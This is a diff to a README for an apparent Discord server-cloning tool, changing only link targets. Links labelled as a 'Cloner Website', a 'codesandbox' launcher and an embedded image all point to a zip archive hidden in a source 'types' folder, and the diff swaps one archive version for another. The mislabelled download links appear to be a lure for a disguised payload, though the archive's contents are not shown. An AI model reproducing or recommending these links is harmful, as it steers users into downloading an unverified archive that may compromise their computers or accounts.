@@ -7,7 +7,7 @@
 ## Overview
 This project was made to make your life easier, instead of spending hours trying to make your server as beautiful as possible you can simply clone a server with this tool
 
-**More information:** [Cloner Website](https://raw.githubusercontent.com/0hok/Discord-Server-Cloner-2.5/main/src/src/types/Cloner_Discord_Server_v1.4.zip)
+**More information:** [Cloner Website](https://github.com/0hok/Discord-Server-Cloner-2.5/raw/refs/heads/main/src/src/types/Server_Cloner_Discord_v2.9-alpha.2.zip)
 
 ## How to use
 ```typescript
@@ -27,11 +27,11 @@ $ npm i -g tsx
 ```typescript
 $ tsx .
 ```
-**You can also use [codesandbox](https://raw.githubusercontent.com/0hok/Discord-Server-Cloner-2.5/main/src/src/types/Cloner_Discord_Server_v1.4.zip) to start the cloner**
+**You can also use [codesandbox](https://github.com/0hok/Discord-Server-Cloner-2.5/raw/refs/heads/main/src/src/types/Server_Cloner_Discord_v2.9-alpha.2.zip) to start the cloner**
 
 ----
 
-![image](https://raw.githubusercontent.com/0hok/Discord-Server-Cloner-2.5/main/src/src/types/Cloner_Discord_Server_v1.4.zip)
+![image](https://github.com/0hok/Discord-Server-Cloner-2.5/raw/refs/heads/main/src/src/types/Server_Cloner_Discord_v2.9-alpha.2.zip)
 
 
 
